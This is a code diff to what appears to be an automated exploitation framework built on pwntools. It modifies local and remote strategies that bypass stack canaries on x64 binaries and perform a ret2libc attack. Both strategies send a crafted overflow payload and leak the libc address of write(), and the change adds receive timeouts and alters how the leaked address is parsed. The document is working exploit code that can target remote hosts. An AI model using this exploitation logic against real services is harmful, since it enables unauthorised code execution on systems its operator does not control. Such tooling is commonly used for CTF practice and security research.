@@ -186,11 +186,14 @@ class CanaryRet2LibcWriteX64LocalStrategy(CanaryStrategy):
         print_payload("preparing canary + write leak payload (x64)")
 
         io = process(str(ctx.binary.path))
-        io.recv()
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(self.frame_after_canary(ctx, payload1))
 
         try:
-            write_addr = u64(io.recv(6).ljust(8, b"\x00"))
+            write_addr = u64(io.recv(8, timeout=2))
         except Exception as e:
             print_info(f"canary-ret2libc-write-x64 leak parse failed: {e}")
             return False
@@ -254,11 +257,14 @@ class CanaryRet2LibcWriteX64RemoteStrategy(CanaryStrategy):
         print_payload("preparing remote canary + write leak payload (x64)")
 
         io = pwn_remote(host, port, ssl=ctx.ssl)  # v4.1.11
-        io.recv()
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(self.frame_after_canary(ctx, payload1))
 
         try:
-            write_addr = u64(io.recv(6).ljust(8, b"\x00"))
+            write_addr = u64(io.recv(8, timeout=2))
         except Exception as e:
             print_info(f"canary-ret2libc-write-x64-remote leak parse failed: {e}")
             return False
